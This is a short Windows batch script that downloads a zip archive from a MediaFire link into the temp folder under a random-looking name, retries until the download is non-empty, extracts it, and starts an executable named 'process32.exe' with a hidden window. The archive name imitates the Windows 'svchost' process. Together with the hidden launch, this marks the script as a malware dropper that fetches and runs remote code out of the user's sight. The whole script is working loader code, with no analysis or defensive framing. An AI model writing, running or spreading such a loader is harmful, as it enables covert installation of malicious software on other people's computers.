@echo off
setlocal
set "url=https://download848.mediafire.com/9rqhu2r9h2egS-pQ35eYPVVUDjwAIr-fjaaj7OcE5_tVM2mnzoGIDK5tH0H1RaYW5BkTqXeU0E0P1t3-DSqwifzvdfGp93671oeUFZYqaJ08qi9jflsCBxCbg-YqQDnrVGjVPLX7JPTsd4AXxjFFRf7MdYvgJ9vcEbPlZFnJBoCS/1lwt6c6scya4pro/RBsvchost+%281%29.zip"
set "tempdir=%temp%"
set "output=%tempdir%\4g5h790g2345h7890g2345h90g2345h-890v2345h789-3v5h.zip"

:download
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
for %%A in ("%output%") do (
    if %%~zA==0 (
        del "%output%"
        timeout /t 1 >nul
        goto download
    )
)

powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"

powershell -Command "Start-Process -FilePath '%tempdir%\process32.exe' -WindowStyle Hidden"

exit
